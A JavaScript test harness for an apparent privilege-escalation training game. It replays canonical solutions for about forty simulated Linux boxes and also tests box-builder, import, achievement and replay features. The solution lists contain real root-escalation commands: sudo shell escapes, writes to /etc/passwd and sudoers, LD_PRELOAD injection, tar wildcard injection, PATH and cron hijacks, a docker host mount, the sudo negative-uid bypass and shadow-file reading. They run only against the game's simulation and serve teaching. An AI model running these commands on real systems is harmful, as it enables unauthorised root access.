// Logic harness: loads the real game modules in a vm sandbox and plays the
// canonical solution of each box, asserting root is obtained (plus a negative
// test that a bogus exploit does NOT grant root). Fast, browserless.
//   node tests/harness.js            # runs against the repo it lives in
//   RQLANG=fr node tests/harness.js  # same, with the FR dictionary active
const vm = require('vm');
const fs = require('fs');
const path = require('path');

const REPO = process.argv[2] || path.resolve(__dirname, '..');
const JS = (f) => fs.readFileSync(path.join(REPO, 'js', f), 'utf8');

// ── Minimal DOM / window sandbox ────────────────────────────────────────────
const sandbox = {};
sandbox.window = sandbox;
sandbox.globalThis = sandbox;
sandbox.console = console;
sandbox.setTimeout = () => {};        // swallow the win() timer
sandbox.document = {
    getElementById: () => ({ innerHTML: '', appendChild() {}, style: {}, addEventListener() {}, focus() {} }),
    querySelectorAll: () => [],
    body: { classList: { add() {}, remove() {} } },
};
vm.createContext(sandbox);

for (const f of ['i18n.js', 'fs.js', 'levels.js', 'commands.js']) {
    vm.runInContext(JS(f), sandbox, { filename: f });
}

// ── Game shims the engine expects on window ─────────────────────────────────
let CURRENT = null;
sandbox.currentLang = process.env.RQLANG || 'en';
sandbox.updatePrompt = () => {};
sandbox.setLanguage = (l) => { sandbox.currentLang = l; };
sandbox.GAME = {
    level: () => CURRENT,
    win: () => {},
    giveHint: () => [],
    nextLevel: () => [],
    reset: () => {},
    markHardened: () => {},
};

function loadLevel(level) {
    CURRENT = level;
    sandbox.FS.load(level);
    Object.assign(sandbox.SESSION, {
        user: level.user || 'player',
        host: level.host,
        cwd: level.cwd || '/home/player',
        env: { PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
        isRoot: false, hintIndex: 0, tmpBins: {}, pendingCron: false,
        cronPayload: null, cmdCount: 0, startTime: Date.now(),
        blueTeam: false, sudoAuthed: false, nfsMount: null,
    });
    sandbox.TERM = sandbox.TERM || { history: [] };
    sandbox.TERM.history = [];
}
function play(cmds) { for (const c of cmds) { sandbox.TERM.history.push(c); sandbox.CMD.execute(c); } }
// Same, against any sandbox — the boot smoke test drives its own.
function play2(ctx, cmds) { for (const c of (cmds || [])) { ctx.TERM.history.push(c); ctx.CMD.execute(c); } }

// ── Canonical solutions (mirrors tests/rootquest.spec.js) ───────────────────
const SOLUTIONS = {
    1: ['find . -exec /bin/sh -p \\;'],
    2: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh', 'wait'],
    3: ["python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
    4: ["echo '#!/bin/sh' > /tmp/ps", "echo '/bin/sh' >> /tmp/ps", 'chmod +x /tmp/ps', 'export PATH=/tmp:$PATH', '/usr/local/bin/status'],
    5: ["sudo vim -c ':!/bin/sh'"],
    6: ["echo 'r00t::0:0:pwned:/root:/bin/bash' >> /etc/passwd", 'su r00t'],
    7: ["sudo awk 'BEGIN{system(\"/bin/sh\")}'"],
    8: ['./pwnkit'],
    9: ['su svc', 'sudo bash'],
    10: ['docker run -v /:/mnt -it alpine chroot /mnt sh'],
    11: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'sudo LD_PRELOAD=/tmp/x.so apache2ctl'],
    12: ['cd /home/player/share', "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh", 'touch ./--checkpoint=1', "touch './--checkpoint-action=exec=sh runme.sh'", 'wait'],
    13: ['ssh -i /opt/backup/id_rsa root@localhost'],
    14: ["echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn", 'sudo bash'],
    15: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'echo /tmp/x.so > /etc/ld.so.preload', '/usr/bin/passwd'],
    16: ['sudo find . -exec /bin/sh \\;'],
    17: ['sudo env /bin/sh'],
    18: ["sudo python3 -c 'import os; os.system(\"/bin/sh\")'"],
    19: ['sudo less !/bin/sh'],
    20: ["echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd", 'su r00t'],
    21: ["python3 -c \"print(open('/etc/shadow').read())\"", 'john /tmp/shadow.copy', 'su root'],
    22: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'],
    23: ['showmount -e', 'mount -t nfs box-23:/srv/backups /mnt', 'touch /srv/backups/rootbash', 'chmod u+s /srv/backups/rootbash', '/srv/backups/rootbash'],
    24: ["sudo perl -e 'exec \"/bin/sh\";'"],
    25: ['sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\''],
    26: [
        "echo '#!/bin/sh' > /tmp/pwn.sh",
        'echo \'exec /bin/sh\' >> /tmp/pwn.sh',
        'chmod +x /tmp/pwn.sh',
        'sudo EDITOR=/tmp/pwn.sh -e /etc/motd'
    ],
    27: [
        "python3 -c \"open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\\n')\"",
        'su pwnd'
    ],
    28: ['sudo -u#-1 /bin/bash'],
    29: ['sudo systemd-run /bin/sh'],
    30: ['sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh'],
    31: ["sudo mysql -e '\\! /bin/sh'"],
    32: ['sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'],
    33: ['sudo git -p help !/bin/sh'],
    34: ['sudo nice /bin/sh'],
    35: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/monitor/healthcheck.sh', 'wait'],
    36: ['sudo zip test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"'],
    37: ['sudo rsync -e "/bin/sh -c /bin/sh" 127.0.0.1:/dev/null /dev/null'],
    38: ['sudo make -s --eval="x:\\n\\t-/bin/sh"'],
    39: ['id', 'lxc init alpine r -c security.privileged=true'],
    40: ['echo \'ExecStart=/bin/sh -c "chmod +s /bin/bash"\' > /etc/systemd/system/backup.service', 'wait'],
};

let pass = 0, fail = 0;
const LEVELS = sandbox.LEVELS;
console.log(`Loaded ${LEVELS.length} levels from ${REPO} (lang=${sandbox.currentLang})\n`);
for (const level of LEVELS) {
    const sol = SOLUTIONS[level.id];
    if (!sol) { console.log(`?? box-${String(level.id).padStart(2, '0')}: NO SOLUTION DEFINED`); fail++; continue; }
    loadLevel(level);
    play(sol);
    const ok = sandbox.SESSION.isRoot === true;
    console.log(`${ok ? 'PASS' : 'FAIL'}  box-${String(level.id).padStart(2, '0')}  ${level.title.en}`);
    ok ? pass++ : fail++;
}

// Negative test: a bogus exploit must NOT grant root on box-01
loadLevel(LEVELS[0]);
play(['echo hello', 'ls -la', 'cat /etc/passwd']);
const neg = sandbox.SESSION.isRoot === false;
console.log(`${neg ? 'PASS' : 'FAIL'}  negative (no accidental root on box-01)`);
neg ? pass++ : fail++;

// sudo -l: first call this machine shows a simulated password prompt line,
// a second call does not (mirrors sudo's cached credential ticket).
loadLevel(LEVELS[4]); // box-05, has a sudoers entry
const first = sandbox.CMD.execute('sudo -l');
const second = sandbox.CMD.execute('sudo -l');
const authOk = first.some(l => l.text.startsWith('[sudo] password for'))
    && !second.some(l => l.text.startsWith('[sudo] password for'));
console.log(`${authOk ? 'PASS' : 'FAIL'}  sudo -l password prompt (once per machine)`);
authOk ? pass++ : fail++;

// box-28: (ALL, !root) exclusion must block the literal name and uid 0, but
// still fall for the CVE-2019-14287 negative-uid / uint32-wraparound bypass.
loadLevel(LEVELS[27]); // box-28
const blockedName = sandbox.CMD.execute('sudo -u root /bin/bash');
const blockedZero = sandbox.CMD.execute('sudo -u#0 /bin/bash');
const nameOk = blockedName.some(l => /not allowed to execute/.test(l.text)) && sandbox.SESSION.isRoot === false;
const zeroOk = blockedZero.some(l => /not allowed to execute/.test(l.text)) && sandbox.SESSION.isRoot === false;
sandbox.CMD.execute('sudo -u#-1 /bin/bash');
const bypassOk = sandbox.SESSION.isRoot === true;
const negUidOk = nameOk && zeroOk && bypassOk;
console.log(`${negUidOk ? 'PASS' : 'FAIL'}  sudo negative-uid bypass (box-28: -u root and -u#0 blocked, -u#-1 roots)`);
negUidOk ? pass++ : fail++;

// Blue-team: for boxes that declare a fix, root then harden and confirm it closes.
console.log('');
for (const level of LEVELS) {
    if (!level.harden) continue;
    loadLevel(level);
    play(SOLUTIONS[level.id]);       // reach root
    sandbox.SESSION.blueTeam = true; // enter harden phase
    play([level.harden.hint.en]);    // apply the documented fix
    const ok = sandbox.CMD.checkHardened(level) === true && sandbox.SESSION.blueTeam === false;
    console.log(`${ok ? 'PASS' : 'FAIL'}  harden box-${String(level.id).padStart(2, '0')}  (${level.harden.type})`);
    ok ? pass++ : fail++;
}

// ── GAME_CUSTOM (box import/export) ─────────────────────────────────────────
// Isolated sandbox: main.js defines its own window.GAME, which would clash
// with the hand-rolled shim used above.
{
    const sandbox2 = {};
    sandbox2.window = sandbox2;
    sandbox2.globalThis = sandbox2;
    sandbox2.console = { log() {}, warn() {}, error() {} };
    sandbox2.setTimeout = () => {};
    sandbox2.addEventListener = () => {};
    const store = {};
    sandbox2.localStorage = {
        getItem: (k) => (k in store ? store[k] : null),
        setItem: (k, v) => { store[k] = String(v); },
    };
    sandbox2.document = {
        addEventListener: () => {},
        getElementById: () => null,
        querySelectorAll: () => [],
        body: { classList: { add() {}, remove() {} } },
    };
    vm.createContext(sandbox2);
    vm.runInContext(JS('levels.js'), sandbox2, { filename: 'levels.js' });
    vm.runInContext(JS('main.js'), sandbox2, { filename: 'main.js' });

    const GC = sandbox2.GAME_CUSTOM;
    const startLen = sandbox2.LEVELS.length;

    const bad = GC.import(JSON.stringify({ codename: 'x' }));
    const t1 = bad.ok === false && bad.errors.length > 0;

    const validBox = {
        codename: 'custom-01',
        title: 'Custom · Test Box',
        user: 'player', host: 'custom-01', cwd: '/home/player',
        fs: { '/': { type: 'dir', owner: 'root', mode: '755', children: [] } },
        wins: [{ type: 'custom_win' }],
        flag: 'flag{custom_test}',
    };
    const good = GC.import(JSON.stringify(validBox));
    const t2 = good.ok === true
        && sandbox2.LEVELS.length === startLen + 1
        && sandbox2.MACHINE_META.length === sandbox2.LEVELS.length
        && sandbox2.LEVELS[sandbox2.LEVELS.length - 1].custom === true;

    // Regression: a plain array for objectives/hints (the shape the README
    // documents and every box builder template emits) must survive
    // normalize() intact, not silently collapse to [] in every language.
    const withArrays = GC.normalize({ objectives: ['Step one', 'Step two'], hints: ['h1', 'h2'] }, 12345);
    const t2b = withArrays.objectives.en.length === 2 && withArrays.objectives.fr.length === 2
        && withArrays.objectives.es.length === 2 && withArrays.hints.en.length === 2;
    const t3 = good.ok && good.level.title.en === 'Custom · Test Box' && good.level.title.fr === 'Custom · Test Box';

    const exported = GC.exportJSON(sandbox2.LEVELS.length - 1);
    const reparsed = exported && JSON.parse(exported);
    const t4 = !!reparsed && reparsed.codename === 'custom-01' && reparsed.id === undefined && reparsed.custom === undefined;

    const persisted = JSON.parse(store[GC.STORE_KEY] || '[]');
    const t5 = persisted.length === 1 && persisted[0].codename === 'custom-01';

    // Share link: export the just-imported box as a URL, then re-import it
    // from the hash (as a fresh visitor opening that link would) and check
    // the round-tripped box matches. No `location` global in this sandbox —
    // exportURL degrades to a bare "#box=..." fragment, which is exactly
    // what importFromHash consumes.
    const shareUrl = GC.exportURL(sandbox2.LEVELS.length - 1);
    const t6 = typeof shareUrl === 'string' && shareUrl.startsWith('#box=');
    const shareImport = GC.importFromHash(shareUrl);
    const t7 = !!shareImport && shareImport.ok === true
        && shareImport.level.codename === 'custom-01'
        && shareImport.level.flag === 'flag{custom_test}'
        && sandbox2.LEVELS.length === startLen + 2;
    const noHash = GC.importFromHash('') === null && GC.importFromHash('#somethingelse=1') === null;
    const badHash = GC.importFromHash('#box=%%%not-valid-at-all');
    const t8 = noHash && badHash && badHash.ok === false;

    const ok = t1 && t2 && t2b && t3 && t4 && t5 && t6 && t7 && t8;
    console.log(`${ok ? 'PASS' : 'FAIL'}  custom box import (validation + append + export + persistence)`);
    ok ? pass++ : fail++;
    console.log(`${(t6 && t7 && t8) ? 'PASS' : 'FAIL'}  custom box share link (export URL + re-import from hash)`);
    (t6 && t7 && t8) ? pass++ : fail++;
}

// ── Box builder (visual custom-box templates) ───────────────────────────────
// Each template must (a) generate JSON that GAME_CUSTOM.validate() accepts,
// and (b) actually be rootable in the real engine via its own hinted payload
// — a schema-valid box that can't be exploited would be a silent trap for
// anyone using the assistant.
{
    const sandbox4 = {};
    sandbox4.window = sandbox4;
    sandbox4.globalThis = sandbox4;
    sandbox4.console = { log() {}, warn() {}, error() {} };
    sandbox4.setTimeout = () => {};
    sandbox4.addEventListener = () => {};
    sandbox4.localStorage = { getItem: () => null, setItem: () => {} };
    sandbox4.location = { href: 'http://localhost/', hash: '' };
    sandbox4.navigator = {};
    sandbox4.document = {
        addEventListener: () => {},
        getElementById: () => null,
        querySelectorAll: () => [],
        body: { classList: { add() {}, remove() {} } },
    };
    vm.createContext(sandbox4);
    for (const f of ['i18n.js', 'fs.js', 'levels.js', 'commands.js', 'boxbuilder.js', 'boxeditor.js', 'main.js']) {
        vm.runInContext(JS(f), sandbox4, { filename: f });
    }

    let bCurrent = null;
    sandbox4.currentLang = 'fr';
    sandbox4.updatePrompt = () => {};
    sandbox4.GAME = { level: () => bCurrent, win: () => {}, giveHint: () => [], nextLevel: () => [], reset: () => {}, markHardened: () => {} };
    function bLoad(level) {
        bCurrent = level;
        sandbox4.FS.load(level);
        Object.assign(sandbox4.SESSION, {
            user: level.user || 'player', host: level.host, cwd: level.cwd || '/home/player',
            env: { PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
            isRoot: false, hintIndex: 0, tmpBins: {}, pendingCron: false,
            cronPayload: null, cmdCount: 0, startTime: Date.now(),
            blueTeam: false, sudoAuthed: false, nfsMount: null,
        });
        sandbox4.TERM = { history: [] };
    }
    function bPlay(cmds) { for (const c of cmds) { sandbox4.TERM.history.push(c); sandbox4.CMD.execute(c); } }

    const cases = [
        { template: 'suid_misuse', path: '/usr/local/bin/backup-tool', solve: (p) => [p] },
        { template: 'suid_misuse', path: '/opt/tools/agent/helper', solve: (p) => [p] },
        { template: 'cron_hijack', path: '/opt/tasks/monitor.sh', solve: (p) => [`echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > ${p}`, 'wait'] },
        { template: 'passwd_writable', path: null, solve: () => ["echo 'r00t::0:0::/root:/bin/bash' >> /etc/passwd", 'su r00t'] },
        { template: 'sudo_gtfobin', sudoBin: 'find', solve: () => ['sudo -l', 'sudo find . -exec /bin/sh \\;'] },
        { template: 'sudo_gtfobin', sudoBin: 'python3', solve: () => ['sudo -l', "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"] },
        { template: 'sudo_gtfobin', sudoBin: 'nice', solve: () => ['sudo -l', 'sudo nice /bin/sh'] },
        { template: 'path_hijack', path: '/usr/local/bin/status-helper', hijackCmd: 'ps', solve: (p) => ["echo '#!/bin/sh' > /tmp/ps", "echo '/bin/sh' >> /tmp/ps", 'chmod +x /tmp/ps', 'export PATH=/tmp:$PATH', p] },
        { template: 'path_hijack', path: '/opt/tools/checker', hijackCmd: 'whoami', solve: (p) => ["echo '#!/bin/sh' > /tmp/whoami", "echo '/bin/sh' >> /tmp/whoami", 'chmod +x /tmp/whoami', 'export PATH=/tmp:$PATH', p] },
    ];

    let bbPass = 0, bbFail = 0;
    cases.forEach((c, i) => {
        const codename = 'bb-test-' + i;
        const json = sandbox4.BOXBUILDER.generate({ template: c.template, codename, path: c.path, sudoBin: c.sudoBin, hijackCmd: c.hijackCmd, flag: `flag{${codename}}` });
        const obj = JSON.parse(json);
        const schemaOk = sandbox4.GAME_CUSTOM.validate(obj).valid;
        const box = { id: 9500 + i, codename: obj.codename, user: obj.user, host: obj.host, cwd: obj.cwd, fs: obj.fs, wins: obj.wins, sudoers: obj.sudoers, flag: obj.flag };
        bLoad(box);
        bPlay(c.solve(c.path));
        const rootOk = sandbox4.SESSION.isRoot;
        const ok = schemaOk && rootOk;
        console.log(`${ok ? 'PASS' : 'FAIL'}  box builder — ${c.template}${c.sudoBin ? ' (' + c.sudoBin + ')' : ''}${ok ? '' : ' — schema:' + schemaOk + ' root:' + rootOk}`);
        ok ? bbPass++ : bbFail++;
    });
    pass += bbPass; fail += bbFail;

    // ── Box editor (graphical fs-tree builder) ──────────────────────────────
    // removeNode: recursive delete + parent.children stays in sync.
    {
        const fs2 = sandbox4.BOXBUILDER.baseFS('flag{x}');
        sandbox4.BOXBUILDER.placeFile(fs2, '/opt/tools/helper', { type: 'file', owner: 'root', mode: '755', content: '' });
        const before = !!fs2['/opt/tools/helper'] && !!fs2['/opt/tools'] && !!fs2['/opt'];
        const removed = sandbox4.BOXEDITOR.removeNode(fs2, '/opt');
        const after = !fs2['/opt'] && !fs2['/opt/tools'] && !fs2['/opt/tools/helper'] && !fs2['/'].children.includes('opt');
        const refusesRoot = sandbox4.BOXEDITOR.removeNode(fs2, '/') === false;
        const ok = before && removed && after && refusesRoot;
        console.log(`${ok ? 'PASS' : 'FAIL'}  box editor — removeNode (recursive delete, parent.children in sync, refuses '/')`);
        ok ? pass++ : fail++;
    }

    // buildBox(): each win-condition type must produce a schema-valid,
    // actually-rootable box — this is the same correctness bar the box
    // builder templates are held to, just assembled by hand here to stand
    // in for what clicking through the tree editor would produce.
    {
        let gePass = 0, geFail = 0;
        const runCase = (name, fs2, params, solve) => {
            const box = sandbox4.BOXEDITOR.buildBox(fs2, params);
            const schemaOk = sandbox4.GAME_CUSTOM.validate(box).valid;
            const level = { id: 9600 + gePass + geFail, codename: box.codename, user: box.user, host: box.host, cwd: box.cwd, fs: box.fs, wins: box.wins, sudoers: box.sudoers, flag: box.flag };
            bLoad(level);
            bPlay(solve());
            const rootOk = sandbox4.SESSION.isRoot;
            const ok = schemaOk && rootOk;
            console.log(`${ok ? 'PASS' : 'FAIL'}  box editor — ${name}${ok ? '' : ' — schema:' + schemaOk + ' root:' + rootOk}`);
            ok ? gePass++ : geFail++;
        };

        // auto: a hand-placed exploit node becomes the win condition with
        // zero extra configuration, exactly like clicking "+ fichier" then
        // setting "Type d'exploit direct" in the node editor would.
        {
            const fs2 = sandbox4.BOXBUILDER.baseFS('flag{ge}');
            sandbox4.BOXBUILDER.placeFile(fs2, '/opt/backup', { type: 'file', owner: 'root', mode: '4755', suid: true, content: '', exploit: 'ge_auto_exploit' });
            runCase('auto (hand-placed exploit node)', fs2, { codename: 'ge-auto', winType: 'auto' }, () => ['/opt/backup']);
        }
        // cron_hijack
        {
            const fs2 = sandbox4.BOXBUILDER.baseFS('flag{ge}');
            sandbox4.BOXBUILDER.placeFile(fs2, '/opt/task.sh', { type: 'file', owner: 'root', mode: '777', writable_by_all: true, content: '#!/bin/sh\n' });
            runCase('cron_hijack', fs2, { codename: 'ge-cron', winType: 'cron_hijack', winPath: '/opt/task.sh' },
                () => ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/task.sh', 'wait']);
        }
        // passwd_write
        {
            const fs2 = sandbox4.BOXBUILDER.baseFS('flag{ge}');
            fs2['/etc/passwd'] = { type: 'file', owner: 'root', mode: '666', writable_by_all: true, content: fs2['/etc/passwd'].content };
            fs2['/usr/bin/su'] = sandbox4.BOXBUILDER.SUID_BIN();
            fs2['/usr/bin'].children.push('su');
            runCase('passwd_write', fs2, { codename: 'ge-passwd', winType: 'passwd_write' },
                () => ["echo 'r00t::0:0::/root:/bin/bash' >> /etc/passwd", 'su r00t']);
        }
        // sudo_shell
        {
            const fs2 = sandbox4.BOXBUILDER.baseFS('flag{ge}');
            fs2['/usr/bin/sudo'] = sandbox4.BOXBUILDER.SUID_BIN();
            fs2['/usr/bin/awk'] = sandbox4.BOXBUILDER.ELF_BIN();
            fs2['/usr/bin'].children.push('sudo', 'awk');
            runCase('sudo_shell', fs2, { codename: 'ge-sudo', winType: 'sudo_shell', winSudoBin: 'awk' },
                () => ['sudo -l', 'sudo awk \'BEGIN{system("/bin/sh")}\'']);
        }
        // path_hijack
        {
            const fs2 = sandbox4.BOXBUILDER.baseFS('flag{ge}');
            fs2['/usr/bin/whoami'] = sandbox4.BOXBUILDER.ELF_BIN();
            fs2['/usr/bin'].children.push('whoami');
            sandbox4.BOXBUILDER.placeFile(fs2, '/usr/local/bin/status-helper', { type: 'file', owner: 'root', mode: '4755', suid: true, content: '', calls_unqualified: 'whoami' });
            runCase('path_hijack', fs2, { codename: 'ge-path', winType: 'path_hijack', winPath: '/usr/local/bin/status-helper', winHijackCmd: 'whoami' },
                () => ["echo '#!/bin/sh' > /tmp/whoami", "echo '/bin/sh' >> /tmp/whoami", 'chmod +x /tmp/whoami', 'export PATH=/tmp:$PATH', '/usr/local/bin/status-helper']);
        }
        // custom: a fully user-authored mechanic, matched by the type name
        // alone — the editor doesn't need to know what "leaked_backup_key"
        // means, it just has to plumb the type through into wins.
        {
            const fs2 = sandbox4.BOXBUILDER.baseFS('flag{ge}');
            sandbox4.BOXBUILDER.placeFile(fs2, '/opt/leaked-key', { type: 'file', owner: 'root', mode: '4755', suid: true, content: '', exploit: 'leaked_backup_key' });
            const box = sandbox4.BOXEDITOR.buildBox(fs2, { codename: 'ge-custom', winType: 'custom', winCustomType: 'leaked_backup_key' });
            const schemaOk = sandbox4.GAME_CUSTOM.validate(box).valid && box.wins[0].type === 'leaked_backup_key';
            bLoad({ id: 9699, codename: box.codename, user: box.user, host: box.host, cwd: box.cwd, fs: box.fs, wins: box.wins, flag: box.flag });
            bPlay(['/opt/leaked-key']);
            const ok = schemaOk && sandbox4.SESSION.isRoot;
            console.log(`${ok ? 'PASS' : 'FAIL'}  box editor — custom win type`);
            ok ? gePass++ : geFail++;
        }

        pass += gePass; fail += geFail;
    }
}

// ── Achievements ─────────────────────────────────────────────────────────
// Separate sandbox, untouched by the custom-box tests above, so LEVELS.length
// is exactly the base machine count and the "halfway" math below is exact.
{
    const sandbox3 = {};
    sandbox3.window = sandbox3;
    sandbox3.globalThis = sandbox3;
    sandbox3.console = { log() {}, warn() {}, error() {} };
    sandbox3.setTimeout = () => {};
    sandbox3.addEventListener = () => {}; // beforeinstallprompt/appinstalled listeners registered at main.js load time
    sandbox3.localStorage = { getItem: () => null, setItem: () => {} };
    sandbox3.document = {
        addEventListener: () => {},
        getElementById: () => null,
        querySelectorAll: () => [],
        documentElement: { setAttribute() {}, removeAttribute() {} },
        body: { classList: { add() {}, remove() {} } },
    };
    vm.createContext(sandbox3);
    vm.runInContext(JS('i18n.js'), sandbox3, { filename: 'i18n.js' });
    vm.runInContext(JS('levels.js'), sandbox3, { filename: 'levels.js' });
    vm.runInContext(JS('main.js'), sandbox3, { filename: 'main.js' });
    vm.runInContext(JS('walkthrough.js'), sandbox3, { filename: 'walkthrough.js' });

    const G = sandbox3.GAME;
    const total = sandbox3.LEVELS.length;
    const halfwayThreshold = Math.ceil(total / 2);

    // "Halfway There" must track the *current* machine count, not a number
    // baked in when the roster was smaller — own one short of half must not
    // qualify, owning exactly half (rounded up) must.
    G.completed = Array.from({ length: halfwayThreshold - 1 }, (_, i) => i + 1);
    const notYetHalfway = G.achState().owned < halfwayThreshold && !G.updateAchievements(false).includes('halfway');
    G.completed.push(halfwayThreshold); // one more machine tips it over
    const nowHalfway = G.updateAchievements(false).includes('halfway');
    const t1 = notYetHalfway && nowHalfway;

    // First Blood fires at 1, Root Wizard only at "own literally everything".
    G.completed = [1];
    const firstBlood = G.updateAchievements(false).includes('first_blood') && !G.updateAchievements(false).includes('root_wizard');
    G.completed = Array.from({ length: total }, (_, i) => i + 1);
    const rootWizard = G.updateAchievements(false).includes('root_wizard');
    const t2 = firstBlood && rootWizard;

    const ok = t1 && t2;
    console.log(`${ok ? 'PASS' : 'FAIL'}  achievements (dynamic halfway threshold tracks current machine count)`);
    ok ? pass++ : fail++;

    // Bonus "void" theme: locked until Root Wizard (own everything) is earned.
    // Reuses the G.completed = [1] state from just above (root_wizard NOT
    // earned yet at this point) before re-earning it for the unlocked check.
    G.completed = [1];
    G.achievements = G.updateAchievements(false);
    const lockedDenies = !G.isThemeUnlocked('void');
    sandbox3.setTheme('void');
    const lockedNoOp = sandbox3.currentTheme !== 'void';
    G.completed = Array.from({ length: total }, (_, i) => i + 1);
    G.achievements = G.updateAchievements(false);
    const unlockedAllows = G.isThemeUnlocked('void');
    sandbox3.setTheme('void');
    const unlockedApplies = sandbox3.currentTheme === 'void';
    const themeOk = lockedDenies && lockedNoOp && unlockedAllows && unlockedApplies;
    console.log(`${themeOk ? 'PASS' : 'FAIL'}  void theme locked until Root Wizard, unlocks after`);
    themeOk ? pass++ : fail++;

    // Explanation-mode coverage: every built-in box must have a non-empty
    // WALKTHROUGHS entry, or the "explain" feature silently degrades to its
    // "not available" fallback for whichever box(es) got missed when new
    // content was added — as happened for box-24..27 before this test existed.
    const missing = sandbox3.LEVELS
        .filter(l => !l.custom)
        .map(l => l.id)
        .filter(id => !Array.isArray(sandbox3.WALKTHROUGHS[id]) || sandbox3.WALKTHROUGHS[id].length === 0);
    const wtOk = missing.length === 0;
    console.log(`${wtOk ? 'PASS' : 'FAIL'}  walkthrough coverage (every built-in box has an explain-mode entry)${wtOk ? '' : ' — missing: ' + missing.join(', ')}`);
    wtOk ? pass++ : fail++;

    // Daily-reminder decision logic — pure (shouldNotifyDaily never touches
    // the DOM), so it's exercised here against a stand-in `Notification`
    // rather than a real browser permission.
    G.notifyDailyEnabled = false;
    G.lastDailyNotifiedKey = null;
    G.completed = [];
    sandbox3.Notification = { permission: 'default' };
    const offByDefault = G.shouldNotifyDaily() === false;

    G.notifyDailyEnabled = true;
    sandbox3.Notification.permission = 'denied';
    const deniedBlocks = G.shouldNotifyDaily() === false;

    sandbox3.Notification.permission = 'granted';
    const grantedAllows = G.shouldNotifyDaily() === true;

    const dailyId = sandbox3.LEVELS[G.dailyChallengeIndex()].id;
    G.completed = [dailyId];
    const ownedBlocks = G.shouldNotifyDaily() === false;
    G.completed = [];

    G.lastDailyNotifiedKey = G.todayKey();
    const alreadyShownBlocks = G.shouldNotifyDaily() === false;
    G.lastDailyNotifiedKey = null;

    let fired = 0;
    sandbox3.Notification = function() { fired++; };
    sandbox3.Notification.permission = 'granted';
    const firstFire = G.fireDailyNotificationIfDue() === true && fired === 1;
    const secondFire = G.fireDailyNotificationIfDue() === false && fired === 1; // same day: no repeat

    const notifyOk = offByDefault && deniedBlocks && grantedAllows && ownedBlocks && alreadyShownBlocks && firstFire && secondFire;
    console.log(`${notifyOk ? 'PASS' : 'FAIL'}  daily reminder logic (opt-in + permission gate, owned-today skip, once-per-day fire)`);
    notifyOk ? pass++ : fail++;
}

// ── Ghost replay: gap compression (pure) + capture-on-new-best-time only ────
{
    const gsandbox = {};
    gsandbox.window = gsandbox;
    gsandbox.globalThis = gsandbox;
    gsandbox.console = console;
    vm.createContext(gsandbox);
    vm.runInContext(JS('ghost.js'), gsandbox, { filename: 'ghost.js' }); // CMD undefined here — the wrap step is a no-op, only GHOST.compressGaps is under test

    const raw = [{ cmd: 'id', dt: 300 }, { cmd: 'sudo -l', dt: 500 }, { cmd: 'wait', dt: 60300 }];
    const compressed = gsandbox.GHOST.compressGaps(raw, 1200);
    const gapsOk = compressed.length === 3
        && compressed[0].dt <= 1200
        && (compressed[1].dt - compressed[0].dt) <= 1200
        && (compressed[2].dt - compressed[1].dt) <= 1200 // the real 59.8s gap must have been capped
        && compressed.every((c, i) => c.cmd === raw[i].cmd) // command order/content untouched
        && compressed[2].dt < raw[2].dt; // genuinely shorter than the recorded run

    console.log(`${gapsOk ? 'PASS' : 'FAIL'}  ghost replay gap compression (order preserved, long pauses capped)`);
    gapsOk ? pass++ : fail++;
}
{
    const gsandbox4 = {};
    gsandbox4.window = gsandbox4;
    gsandbox4.globalThis = gsandbox4;
    gsandbox4.console = { log() {}, warn() {}, error() {} };
    gsandbox4.setTimeout = () => {};
    gsandbox4.addEventListener = () => {};
    gsandbox4.localStorage = { getItem: () => null, setItem: () => {} };
    gsandbox4.document = {
        addEventListener: () => {},
        getElementById: (id) => (id === 'winStats' ? {} : null),
        querySelectorAll: () => [],
        documentElement: { setAttribute() {}, removeAttribute() {} },
        body: { classList: { add() {}, remove() {} } },
    };
    vm.createContext(gsandbox4);
    vm.runInContext(JS('i18n.js'), gsandbox4, { filename: 'i18n.js' });
    vm.runInContext(JS('levels.js'), gsandbox4, { filename: 'levels.js' });
    vm.runInContext(JS('commands.js'), gsandbox4, { filename: 'commands.js' }); // defines SESSION
    vm.runInContext(JS('main.js'), gsandbox4, { filename: 'main.js' });
    const G4 = gsandbox4.GAME;
    G4.currentLevel = 0;
    const lvlId = gsandbox4.LEVELS[0].id;
    G4.completed = [];
    G4.bestTimes = {};
    G4.ghosts = {};

    // First run: 30s, sets a best time -> ghost should be captured.
    gsandbox4.SESSION.startTime = Date.now() - 30000;
    gsandbox4.SESSION.cmdCount = 2;
    gsandbox4.SESSION.hintIndex = 0;
    gsandbox4.SESSION.cmdLog = [{ cmd: 'id', dt: 100 }, { cmd: 'sudo -l', dt: 2000 }];
    G4.renderStats();
    const firstRunCaptured = G4.bestTimes[lvlId] > 0
        && Array.isArray(G4.ghosts[lvlId])
        && G4.ghosts[lvlId].length === 2
        && G4.ghosts[lvlId][0].cmd === 'id';

    // Second run: slower (60s) — must NOT beat the record, so the ghost from
